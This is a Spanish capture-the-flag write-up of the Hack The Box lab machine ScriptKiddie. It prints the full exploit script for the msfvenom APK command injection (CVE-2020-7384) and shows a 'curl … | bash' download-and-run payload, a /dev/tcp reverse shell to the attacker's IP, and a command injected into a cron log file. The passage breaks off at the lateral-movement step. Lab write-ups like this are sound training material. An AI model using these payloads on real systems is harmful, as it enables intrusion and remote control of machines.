---
title: ScriptKiddie WriteUp
date: 2024-05-07
categories: [WriteUps, Máquinas Linux]
tags: [CVE, RCE, sudo]
image:
  path: ../../assets/img/writeups/ScriptKiddie/scriptkiddie.png
  width: 528
  height: 340
  alt: Banner ScriptKiddie
---

¡Paxaaaa!. Ahí va el resumen de la máquina -avisados estáis-; máquina linux que podemos explotar desde la web con el CVE-2020-7384, este explota una vulnerabilidad en el programa msfvenom. Una vez dentro del sistema objetivo hacemos un movimiento lateral a otro usuario gracias a una tarea cron y luego escalamos a root gracias al privilegio sudo en msfconsole.

## Reconocimiento

¡Holiiita!. Hoy hackearé la máquina ScriptKiddie, la IP de la máquina es la **10.10.10.226**. Esta vez vez resolveré la máquina con el **Guided Mode** -hasta la mitad, luego me lanzo a realizarlo solo-. Para las que no lo sepan el procedimiento es similar al de siempre pero te van guiando digamos a través de unas preguntas que tendrás que resolver.  

La primera pregunta del Guided Mode es; **How many TCP ports are open on ScriptKiddie?**.

Lo primero que hay que hacer es escanear los puertos del objetivo -si no lo supieramos la pregunta nos hubiera ayudado a descubrirlo-. Usaremos nmap para esto.

```sh
❯ nmap 10.10.10.226 -p- --open --min-rate 5000 -vvv -Pn -n -oN ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-07 08:53 CEST
Initiating SYN Stealth Scan at 08:53
Scanning 10.10.10.226 [65535 ports]
Discovered open port 22/tcp on 10.10.10.226
Discovered open port 5000/tcp on 10.10.10.226
Completed SYN Stealth Scan at 08:53, 12.46s elapsed (65535 total ports)
Nmap scan report for 10.10.10.226
Host is up, received user-set (0.049s latency).
Scanned at 2024-05-07 08:53:11 CEST for 13s
Not shown: 65176 closed tcp ports (reset), 357 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
           Raw packets sent: 66161 (2.911MB) | Rcvd: 65178 (2.607MB)
```

Antiguamente usaba también la opción **-sS**; *El sondeo SYN es el utilizado por omisión y el más popular por buenas razones*. Pero me enteré de eso mismo, que por defecto se usa ya.

Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.226: Dirección IP objetivo, la cual quiero escanear
* -oN ports : Exportará el output a un fichero normal de nmap llamado "ports"

Ya podríamos contestar a la primera pregunta del "Guided Mode".  
*How many TCP ports are open on ScriptKiddie?*  
Respuesta; 2

Siguiente pregunta del Guided Mode; **What is the most likely binary that the webpage uses to create a payload in the "payloads" section?**

Traducido al castellano sería; ¿Cuál es el binario más probable que utiliza la página web para crear una carga útil en la sección "cargas útiles"?. Aquí ya nos dirigen hacía la web. Pero antes de esto me gustaría escanear un poco más esos dos puertos expuestos:

```sh
❯ nmap 10.10.10.226 -p22,5000 -sC -sV -Pn -oN services
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-07 09:03 CEST
Nmap scan report for 10.10.10.226
Host is up (0.049s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA)
|   256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA)
|_  256 8bcf4182c6acef9180377cc94511e843 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
```

En este punto podríamos buscar vulnerabilidades de esas dos versiones que tenemos; **OpenSSH 8.2p1** -poca cosa- y **Werkzeug/0.16.1**.

```sh
❯ searchsploit Werkzeug
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Pallets Werkzeug 0.15.4 - Path Traversal                                                                                                              | python/webapps/50101.py
Werkzeug - 'Debug Shell' Command Execution                                                                                                            | multiple/remote/43905.py
Werkzeug - Debug Shell Command Execution (Metasploit)                                                                                                 | python/remote/37814.rb
```

Entrando en el de metasploit leemos que es para versiones del 0.10 y anteriores, así que seguramente nada. Y la de python será el exploit de metasploit pero escrito en python. Podríamos probarlos aun así, pero prefiero echar un vistazo a la web primero y contestar a la segunda pregunta. Antes de entrar al navegador lanzaré la herramienta **whatweb**:

```sh
❯ whatweb http://10.10.10.226:5000
http://10.10.10.226:5000 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.16.1 Python/3.8.5], IP[10.10.10.226], Python[3.8.5], Title[k1d'5 h4ck3r t00l5], Werkzeug[0.16.1]
```
Voy a la web, en la URL; `http://10.10.10.226:5000`

![Web]({{ 'assets/img/writeups/ScriptKiddie/web.png' | relative_url }}){: .center-image }

En el apartado "Payloads" dice "Venom it up". Conozco un binario/ejecutable con el apodo venom, y es el **msfvenom** -estudiado en el módulo para la creación de payloads-.  
La respuesta a la segunda pregunta es entonces **msfvenom**.  
En la imagen de arriba faltaría el apartado "exploits" que se encuentra más abajo.

Tercera pregunta; **What is the 2020 CVE ID for a command injection vulnerability in msfvenom?**

Si busco en google por **CVE 2020 command injection msfvenom** la mayoría de resultados vienen con **CVE-2020-7384**. En la página de [mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384) tenemos más info. En la descripción dice esto; "Rapid7's Metasploit msfvenom framework handles APK files in a way that allows for a malicious user to craft and publish a file that would execute arbitrary commands on a victim's machine.".  
Respuesta a la tercera pregunta; **CVE-2020-7384**. Se podría decir que no estamos preparando para vulnerar la aplicación Metasploit msfvenom framework.

Cuarta pregunta; **What is the file extension on the payload generated to exploit CVE-2020-7384? (Don't include the leading dot.)**

Para averiguarlo he buscado por internet el CVE y me he metido a la página de metasploit, [por aquí](https://www.exploit-db.com/exploits/49491). Ya desde aquí puedes ver que hablan de paquetes apk, tiene sentido porque abajo del todo parece que estan hablando de un payload sobre android:

```plaintext
... SNIP ...
rint()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
```

Aun así he querido mirar más, desde consola:

```sh
❯ msfvenom -p android/meterpreter/reverse_tcp --list-options
Options for payload/android/meterpreter/reverse_tcp:
=========================


       Name: Android Meterpreter, Android Reverse TCP Stager
     Module: payload/android/meterpreter/reverse_tcp
   Platform: Android
       Arch: dalvik
Needs Admin: No
 Total size: 10225
       Rank: Normal

Provided by:
.. SNIP ...

❯ locate reverse_tcp | grep "android"
/usr/share/doc/metasploit-framework/modules/payload/android/meterpreter/reverse_tcp.md
/usr/share/metasploit-framework/lib/msf/core/payload/android/reverse_tcp.rb
/usr/share/metasploit-framework/modules/payloads/singles/android/meterpreter_reverse_tcp.rb
/usr/share/metasploit-framework/modules/payloads/stagers/android/reverse_tcp.rb

# Y ya localizado le he hecho un cat:
> cat /usr/share/doc/metasploit-framework/modules/payload/android/meterpreter/reverse_tcp.md

# Y he encontrado lo siguiente:
... sNIP ..
./msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
.. SNIP ..
```

Encontré bastantes referencias de como crear un payload con esa extensión.

Quinta pregunta; **What user is the website running as?**

Aquí entiendo que ya hay que explotar la web, para saber posteriormente el usuario. Parece que nos dejan claro que hay que usar el CVE-2020-7384.

**Hay que entender** que hace ese CVE, que hace el exploit. Por aquí la explicación en perfecto inglés:

```plaintext
Metasploit Framework's `msfvenom` is vulnerable to a command injection
vulnerability when the user provides a crafted APK file to use as an Android
payload template. A "template" file in this context is an existing APK file,
within which an Android payload will be embedded.

The vulnerability affects Metasploit Framework <= 6.0.11 and Metasploit Pro <=
4.18.0
```
Parece que la web nos da la utilidad de crear payload con msfvenom. Desde el apartado "Payload" de la Web es como si la víctima hiciera algo así:

```sh
# Lo que haría el usuario web objetivo desde la web:
msfvenom -p android/meterpreter/reverse_tcp -x msf.apk
```

Nos faltaría crear un .apk para pasarle.

## Creación del archivo .apk

Abro **msfconsole**:

```sh
> msfconsole

[msf](Jobs:0 Agents:0) >> help search
Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.


OPTIONS:

    -h, --help                      Help banner
    -I, --ignore                    Ignore the command if the only match has the same name as the search
    -o, --output <filename>         Send output to a file in csv format
    -r, --sort-descending <column>  Reverse the order of search results to descending order
    -S, --filter <filter>           Regex pattern used to filter search results
    -s, --sort-ascending <column>   Sort search results by the specified column in ascending order
    -u, --use                       Use module if there is one result

Keywords:
  adapter          :  Modules with a matching adater reference name
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
 ... SNIP ...

[msf](Jobs:0 Agents:0) >> search cve:2020-7384

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
```

Es tipo **exploit** por la ruta que señala. Si funciona quizás estemos dentro de la máquina objetivo.

```sh
[msf](Jobs:0 Agents:0) exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) >> show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic


View the full module info with the info, or info -d command.
```

```sh
❯ locate metasploit_msfvenom_apk_template_cmd_injection
/usr/share/doc/metasploit-framework/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection.md
/usr/share/metasploit-framework/modules/exploits/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection.rb

> cat /usr/share/doc/metasploit-framework/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection.md
# Aquí podemos ver como funciona hasta los pasos a seguir.
```

El módulo lo que hará es crear una plantilla que se guardará en local. Para explotar la vulnerabilidad objetivo el usuario objetivo tendría que hacer esto; `msfvenom -p android/meterpreter/reverse_tcp -x msf.apk` donde el msf.apk es la plantilla generada en este módulo. En la imagen de la web verás que tenemos la funcionalidad para hacer algo así.

Así que probemos a crear la plantilla con ese módulo:

```sh
[msf](Jobs:0 Agents:0) exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) >> exploit

[-] Exploit failed: cmd/unix/python/meterpreter/reverse_tcp: All encoders failed to encode.
```

Parece que nos da un fallo. La explicación del fallo [aquí](https://github.com/rapid7/metasploit-framework/issues/17246) pero en resumen; En este caso, el marco indica correctamente que la carga útil es incompatible porque no se puede codificar para evitar los caracteres definidos por el autor del módulo.

En este punto podríamos arreglar el payload -si se pudiera-, cambiar a otro payload o probar otra manera que no sea con este módulo.

Vuelvo a buscar el **cve-2020-7384 exploit** por Internet. Metiendome primero en nikhil1232 de github, en el README sale el exploit original; https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md  

Otra manera de llegar a este script, realmente es la manera fácil y la que suelo realizar, es usando el comando **searchsploit**:

```sh
❯ searchsploit msfvenom
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                                 | multiple/local/49491.py
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Vamos a llevarnos el script al directorio actual que estemos e **intentar entenderlo antes de ejecutarlo sin más**.

```sh
❯ searchsploit -m 49491
  Exploit: Metasploit Framework 6.0.11 - msfvenom APK template command injection
      URL: https://www.exploit-db.com/exploits/49491
     Path: /opt/exploitdb/exploits/multiple/local/49491.py
    Codes: CVE-2020-7384
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/guise/HTB/Machines/Linux/ScriptKiddie/reco/49491.py

# Aprovecho para cambiarle el nombre y darle permisos de ejecución:

❯ mv 49491.py createAPK.py
❯ chmod +x createAPK.py
```

Este es el contenido del script en python3:

```python
#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b32encode

# Change me
payload = 'echo "Code execution as $(id)" > /tmp/win'

# b32encode to avoid badchars (keytool is picky)
# thanks to @fdellwing for noticing that base64 can sometimes break keytool
# <https://github.com/justinsteven/advisories/issues/2>
payload_b32 = b32encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b32} | base32 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
```

Aunque no entiendas todo al menos lee con detenimiento y sobretodo **conoce que hace**. Importante ese **Change me** del script, ahí estará el payload que quieras añadir.

**Por conocer más**:  
Msfvenom tiene la vulnerabilidad en la llamada a la plantilla, ya que por lo visto se puede introducir un payload en la variable dname que corresponde al valor de la opción dname del comando keytook, opción que proporciona información de identidad a la clave que se genere.

Cambiaremos el payload del "Change me" por un ping hacia nuestra IP a ver si funciona. Así que en el script:

```python
... SNIP ..
# Change me
payload = 'ping -c 1 10.10.14.19'

... SNIP ...
```

Ejecutamos el script para crear la plantilla en formato apk:

```sh
❯ python3 createAPK.py
[+] Manufacturing evil apkfile
Payload: ping -c 1 10.10.14.19
-dname: CN='|echo cGluZyAtYyAxIDEwLjEwLjE0LjE5 | base64 -d | sh #

  adding: empty (stored 0%)
Generando par de claves RSA de 2.048 bits para certificado autofirmado (SHA256withRSA) con una validez de 90 días
	para: CN="'|echo cGluZyAtYyAxIDEwLjEwLjE0LjE5 | base64 -d | sh #"
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmpd31m_r3o/evil.apk
Do: msfvenom -x /tmp/tmpd31m_r3o/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

Se ha guardado en **/tmp/tmpd31m_r3o/evil.apk**. Voy a copiarlo y dejarlo en mi carpeta Descargas -para buscarlo más fácil y por tema de permisos-. Además cambiaré el propietario del apk por el mismo tema de los permisos con el navegador:

```sh
❯ cp /tmp/tmpd31m_r3o/evil.apk /home/guise/Descargas

❯ ls -l evil.apk
.rw-r--r-- root root 1.9 KB Wed May  8 17:42:13 2024  evil.apk
❯ chown guise:guise evil.apk
❯ ls -l evil.apk
.rw-r--r-- guise guise 1.9 KB Wed May  8 17:42:13 2024  evil.apk
```

## Explotación y Reverse Shell

Ya podemos intentar la explotación de la vulnerabilidad en msfvenom. Primero nos ponemos en escucha de trazas ICMP para comprobar que funciona ese *ping* y tenemos RCE:

```sh
❯ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Y ahora en la web objetivo, en la sección payloads en os=android, en lhost podemos poner 127.0.0.1 (creo que valdría cualquier cosa) y en template file subiremos el recién apk creado con el script de python3, el **evil.apk**. Damos a "Generate":

![Web2]({{ 'assets/img/writeups/ScriptKiddie/webExploit.png' | relative_url }}){: .center-image }

Y parece que nos llega el ping:

```sh
❯ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:47:20.338956 IP 10.10.10.226 > 10.10.14.19: ICMP echo request, id 1, seq 1, length 64
17:47:20.338971 IP 10.10.14.19 > 10.10.10.226: ICMP echo reply, id 1, seq 1, length 64
```

Ahora en vez de lanzarnos un ping vamos a lanzarnos una reverse, hay bastantes maneras para hacerlo, pero una sencilla que no suele dar problemas porque no tiene muchos caracteres especiales de por medio es `curl IPLOCAL | bash`. Si nosotras abrimos un servidor en python en local; `python3 -m http.server 80` y en ese directorio donde abrimos el servidor alojamos un **index.html** con el siguiente contenido:

```html
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.19/443 0>&1
```

Cuando el objetivo lanze el comando `curl IPLOCAL | bash` querrá descargarse el index.html (siempre van a ese archivo por defecto digamos) del servidor que comparto, luego ejecutará el contenido. Miremos el ejemplo que hago en local:

```sh
# Me pongo en escucha desde una consola:
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```sh
# Desde otra consola (simulando lo que hará la víctima gracias al RCE):
❯ curl 10.10.14.19 | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    54  100    54    0     0  53518      0 --:--:-- --:--:-- --:--:-- 54000
```

```sh
# Y desde una tercera consola estando en escucha con nc:
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.14.19] 33492
┌─[root@parrot]─[/home/guise]
└──╼ #
# Hemos recibido la reverse shell
```

Una vez expuesto el ejemplo en local vamos a realizarlo contra el objetivo. Primero, cambiemos el payload en el script de python3. También cambio el final de la línea del **dname** simplemente cambio sh por bash, por si acaso:

```python
.. SNIP ..
# Change me
payload = 'curl 10.10.14.19 | bash'

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | bash #"

.. SNIP ..
```

Ejecuto el script con python3 para generar el nuevo apk:

```sh
❯ python3 createAPK.py
[+] Manufacturing evil apkfile
Payload: curl 10.10.14.19 | bash
-dname: CN='|echo Y3VybCAxMC4xMC4xNC4xOSB8IGJhc2g= | base64 -d | bash #

  adding: empty (stored 0%)
Generando par de claves RSA de 2.048 bits para certificado autofirmado (SHA256withRSA) con una validez de 90 días
	para: CN="'|echo Y3VybCAxMC4xMC4xNC4xOSB8IGJhc2g= | base64 -d | bash #"
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmpv2wo4gko/evil.apk
Do: msfvenom -x /tmp/tmpv2wo4gko/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

El archivo se ha guardado en **/tmp/tmpv2wo4gko/evil.apk** lo paso a descargas para tenerlo más a mano, y le cambio propietario por tema de permisos con el navegador:

```sh
# Elimino primero el que ya estaba:
❯ rm /home/guise/Descargas/evil.apk
# Ahora si:
❯ mv /tmp/tmpv2wo4gko/evil.apk /home/guise/Descargas
❯ chown guise:guise /home/guise/Descargas/evil.apk
```

Vamos a la web y hacemos lo mismo que antes; en la sección payloads en os=android, en lhost podemos poner 127.0.0.1 (creo que valdría cualquier cosa) y en template file subiremos el apk creado con el anterior script de python3, el **evil.apk**. Antes de dar a "Generate" nos abrimos un servidor en python3, en el mismo directorio donde esté el index.html visto arriba. Y en otra terminal/consola nos ponemos en escucha:

```sh
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
```

Ahora si, demos a "Generate".

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.226] 33628
bash: cannot set terminal process group (838): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ ifconfig -a
ifconfig -a
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.226  netmask 255.255.255.0
... SNIP ...
```

Hemos obtenido una shell. Y como se puede ver estamos en el host objetivo **10.10.10.226**.

Obtengamos la primera flag:

```sh
kid@scriptkiddie:~/html$ whoami
whoami
kid
kid@scriptkiddie:~/html$ cd /home/kid
cd /home/kid
kid@scriptkiddie:~$ ls
ls
html
logs
snap
user.txt
kid@scriptkiddie:~$ cat user.txt
cat user.txt
40b8dc2eb36d67db46bfeef5c30b278d
```

Funciona un poco mal porque no estamos en una Full TTY, para conseguirla hay que hacer un "tratamiento de la tty". Hagámoslo:

```sh
# En máquina objetivo:
kid@scriptkiddie:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
kid@scriptkiddie:~/html$ ^Z
zsh: suspended  nc -nlvp 443
```

Hemos salido con el "Ctrl + Z" a local, ahora:

```sh
stty raw -echo; fg
reset xterm
```

Y de vuelta en remoto:

```sh
kid@scriptkiddie:~/html$ echo $TERM
dumb
kid@scriptkiddie:~/html$ export TERM=xterm
kid@scriptkiddie:~/html$ echo $SHELL
/bin/bash

# Antes de lo siguiente compruebo en local el tamaño con; stty size
kid@scriptkiddie:~/html$ stty rows 38 columns 184
```

## Escalada de privilegios

Somos el usuario **kid** como ahora veremos, pero hay otro usuario llamado **pwn**:

```sh
kid@scriptkiddie:/home$ whoami
kid
kid@scriptkiddie:/home$ ls -l /home
total 8
drwxr-xr-x 11 kid kid 4096 Feb  3  2021 kid
drwxr-xr-x  6 pwn pwn 4096 Feb  3  2021 pwn

kid@scriptkiddie:/home$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
```

Vayamos con los comandos que suelo usar para intentar escalar:

```sh
# Para averiguar en grupos estoy
kid@scriptkiddie:/home$ id
uid=1000(kid) gid=1000(kid) groups=1000(kid)

# ¿Tendremos previlegios de sudo?. No lo sabremos porque piden contraseña que no tenemos.
kid@scriptkiddie:/home$ sudo -l
[sudo] password for kid: 

# Programas por permisos de SUID. El pkexec se puede aprovechar quizás, pero la máquina no estaba creada para elevar así.
kid@scriptkiddie:/home$ find / \-perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/at

# Para averiguar la versión de kernel y si hay vulnerabilidades:
kid@scriptkiddie:/home$ uname -a
Linux scriptkiddie 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

# Distribución y versión del Sistema Operativo
kid@scriptkiddie:/home$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.1 LTS
Release:	20.04
Codename:	focal

# Crontabs
kid@scriptkiddie:/home$ crontab -l
no crontab for kid
```

Podríamos buscar tareas que se repiten a intervalos regulares de tiempo con la herramienta **pspy**. Antes de eso voy a ojear un poco las carpetas del sistema.

```sh
kid@scriptkiddie:/home$ cd kid
kid@scriptkiddie:~$ ls -la
total 60
drwxr-xr-x 11 kid  kid  4096 Feb  3  2021 .
drwxr-xr-x  4 root root 4096 Feb  3  2021 ..
lrwxrwxrwx  1 root kid     9 Jan  5  2021 .bash_history -> /dev/null
-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout
-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc
drwxrwxr-x  3 kid  kid  4096 Feb  3  2021 .bundle
drwx------  2 kid  kid  4096 Feb  3  2021 .cache
drwx------  4 kid  kid  4096 Feb  3  2021 .gnupg
drwxrwxr-x  3 kid  kid  4096 Feb  3  2021 .local
drwxr-xr-x  9 kid  kid  4096 Feb  3  2021 .msf4
-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile
drwx------  2 kid  kid  4096 Feb 10  2021 .ssh
-rw-r--r--  1 kid  kid     0 Jan  5  2021 .sudo_as_admin_successful
drwxrwxr-x  5 kid  kid  4096 Feb  3  2021 html
drwxrwxrwx  2 kid  kid  4096 Feb  3  2021 logs
drwxr-xr-x  3 kid  kid  4096 Feb  3  2021 snap
-r--------  1 kid  kid    33 May  7 06:35 user.txt
kid@scriptkiddie:~$ cd logs
kid@scriptkiddie:~/logs$ ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Feb  3  2021 .
drwxr-xr-x 11 kid kid 4096 Feb  3  2021 ..
-rw-rw-r--  1 kid pwn    0 Feb  3  2021 hackers
```

Archivo **hackers** con permiso de escritura..mmm parece ser un vector de ataque. Se me ocurre buscar desde /home, por ejemplo, por esa palabra, a ver si se encuentra la palabra en un ejecutable o archivo.

```sh
kid@scriptkiddie:/home$ grep -ri "hackers" 2>/dev/null
pwn/scanlosers.sh:log=/home/kid/logs/hackers
kid/html/app.py:        with open('/home/kid/logs/hackers', 'a') as f:
kid/.msf4/store/modules_metadata.json:      "URL-http://bazaar.launchpad.net/~apport-hackers/apport/trunk/revision/2943"
kid/.msf4/store/modules_metadata.json:      "URL-http://roothackers.net/showthread.php?tid=92"
kid/.msf4/store/modules_metadata.json:    "description": "This module takes advantage of the China Chopper Webshell that is\n        commonly used by Chinese hackers.",
kid/.msf4/store/modules_metadata.json:      "URL-https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html"
kid/.msf4/store/modules_metadata.json:      "URL-http://www.amazon.com/Oracle-Hackers-Handbook-Hacking-Defending/dp/0470080221"
... SNIP ...
```

Interesante, parece que en el script **scanlosers.sh** se usa. Vayamos a ver que hace, este es su contenido:

```sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

Parece ser que espera en el tercer campo en adelante una IP para luego hacer un nmap a esa IP. Hago un ejemplo en local:

```sh
❯ echo "Hola Paco 10.10.14.19" | cut -d' ' -f3-
10.10.14.19
```

Entonces esa IP será sustituida de esta manera:

```sh
# De esto:
sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &

# Pasará a:
sh -c "nmap --top-ports 10 -oN recon/${10.10.14.19}.nmap ${10.10.14.19} 2>&1 >/dev/null" &
```

El fallo puede estar en ese -f3- ya que no solo coge el campo 3, también los siguientes:

```sh
❯ echo "Hola Paco 10.10.14.19 peras" | cut -d' ' -f3-
10.10.14.19 peras
```

¿Y si inyectaramos un comando?. Haciendo pruebas en local parece que doy con una estructura que parece funcionar:

```sh
❯ echo "Hola Paco 10.10.14.19 ;id #" > prueba2
❯ cat prueba2 | cut -d' ' -f3- | sort -u | while read ip; do sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null"; done
Failed to open normal output file recon/10.10.14.19 for writing: No such file or directory (2)
uid=0(root) gid=0(root) grupos=0(root)

# El ; es para aislar lo siguiente (el comando) y la almohadilla es para comentar todo lo de después.
```

Ahora bien, si inyectamos el comando ¿quién lo ejecuta?. Lo podríamos saber con la herramienta pspy por ejemplo, entre otras formas, pero todo parece indicar que lo ejecutaría el propietario, que es **pwn**:

